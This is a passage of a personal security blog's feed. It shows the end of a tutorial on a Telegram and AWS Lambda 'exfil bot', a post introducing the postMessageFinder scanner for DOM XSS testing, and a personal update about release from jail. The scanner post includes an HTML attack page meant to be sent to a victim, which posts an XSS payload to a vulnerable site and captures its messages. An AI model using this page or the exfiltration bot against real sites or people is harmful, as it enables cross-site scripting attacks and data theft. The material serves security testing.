and taking note of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; field of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chat&lt;/code&gt; object:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-url&quot;&gt;https://api.telegram.org/bot&amp;lt;bot-token&amp;gt;/getUpdates
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-29.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After adding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bot Token&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chat ID&lt;/code&gt; in the code of the serverless function, we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Deploy&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-31.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We test the bot going to the URL provided after creating the API:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-32.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If everything is fine, we should get a message at Telegram with the HTTP request details,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-33.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And that‚Äôs it, we just built a nice OOB bot XD ü•≥ü•≥ü•≥ü•≥ü•≥ü•≥ü•≥&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;In the next post I will show you how to use your own domain in the URL, to get something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_23-57.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cheers!!!! üòâ&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;If any comment with this or suggestion, please contact me at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xpl0ited1@pm.me&lt;/code&gt;&lt;/p&gt;</content><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><category term="update," /><category term="exfiltrating" /><summary type="html">Helloooooooooo ü§óü§óü§ó, in this post I will show you how to create a serverless exfil bot with Telegram and AWS Lambda + API Gateway.</summary></entry><entry><title type="html">Tools: postMessageFinder</title><link href="https://xpl0ited1.io/postsmessagefinder/" rel="alternate" type="text/html" title="Tools: postMessageFinder" /><published>2021-07-12T01:25:20-04:00</published><updated>2021-07-12T01:25:20-04:00</updated><id>https://xpl0ited1.io/postsmessagefinder</id><content type="html" xml:base="https://xpl0ited1.io/postsmessagefinder/">&lt;p&gt;Here now I‚Äôm presenting to you a tool I made last year that now I‚Äôm retaking, and tweaking.
This tool checks if a set of urls contains one or more postMessage functions or eventhandlers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pelaohxc/postMessageFinder/raw/master/example.png&quot; alt=&quot;poc&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./postMessageFinder -i urls.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Usage of postMessageFinder:
  -H value
        Headers ex: -H='Cookie: PHPSESSID=shjhjdgvbhjhvnv'
  -i string
        Path to file containing urls to test (default &quot;urls.txt&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is useful for testing for DOM XSS vulnerabilities and issues, were it could be exploited by using iFrames or child pages.
For example you could host the following HMTL code in a webpage and send that page to your victim, and a popup will be opened sending to it a postMessage with a malicious flavour:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://vulnerablewebsite.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;popupType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_blank&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;popupOptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;width=500,height=500&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//opening the popup&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;childWindow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;popupType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;popupOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//sending the postMessage&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;childWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;vulnerableObject&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xss&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;//Here you can capture any postmessage on the child page&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//your data is captured in e.data &lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;The original github URL was at &lt;a href=&quot;https://github.com/pelaohxc/postMessageFinder&quot;&gt;@pelaohxc&lt;/a&gt; account, that was expropiated by the donkeys üí©, now I will be pushing updates to this  Github repo: &lt;a href=&quot;https://github.com/xpl0ited1/postMessageFinder&quot;&gt;@xpl0ited1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In the next posts I will be posting how to exploit this postMessage issues, so stay in touch! ü§≠&lt;/p&gt;</content><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><category term="tools," /><category term="update" /><summary type="html">Here now I‚Äôm presenting to you a tool I made last year that now I‚Äôm retaking, and tweaking. This tool checks if a set of urls contains one or more postMessage functions or eventhandlers.</summary></entry><entry><title type="html">I‚Äôm baaaaaaaaaaaaack!</title><link href="https://xpl0ited1.io/im-baaaack/" rel="alternate" type="text/html" title="I‚Äôm baaaaaaaaaaaaack!" /><published>2021-07-12T00:19:20-04:00</published><updated>2021-07-12T00:19:20-04:00</updated><id>https://xpl0ited1.io/im-baaaack</id><content type="html" xml:base="https://xpl0ited1.io/im-baaaack/">&lt;p&gt;Finally I‚Äôm in home again, but the fkn process is not ended. I was waiting for months to recover my freedom and now I‚Äôm with my people again.&lt;/p&gt;

&lt;p&gt;It‚Äôs been about 9 or 10 month since I was jailed, but finally after 7 months of a bloody and horrible wait I‚Äôve recovered my ‚Äúfreedom‚Äù.&lt;/p&gt;

&lt;p&gt;I was looking for job in CyberSecurity, I was rejected by most of the companies here in my country, but finally someone &lt;del&gt;hired me XD&lt;/del&gt; tried to hired me, and regretted and canceled the contract üò¢.&lt;/p&gt;

&lt;p&gt;In the next weeks I will be posting some nice tricks and writeups of many of my researches and some crazy stuff I‚Äôve learned ‚Äúinside‚Äù that could be interesting for some people.&lt;/p&gt;

&lt;p&gt;If any questions regarding me or my process and you are a journalist, well‚Ä¶ fuck off.
If you want to learn, I‚Äôm making a video series for mobile penetration testing, that will go live soon!
Cheers!üôÉ‚ò†Ô∏è&lt;/p&gt;</content><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><category term="update" /><summary type="html">Finally I‚Äôm in home again, but the fkn process is not ended. I was waiting for months to recover my freedom and now I‚Äôm with my people again.</summary></entry></feed>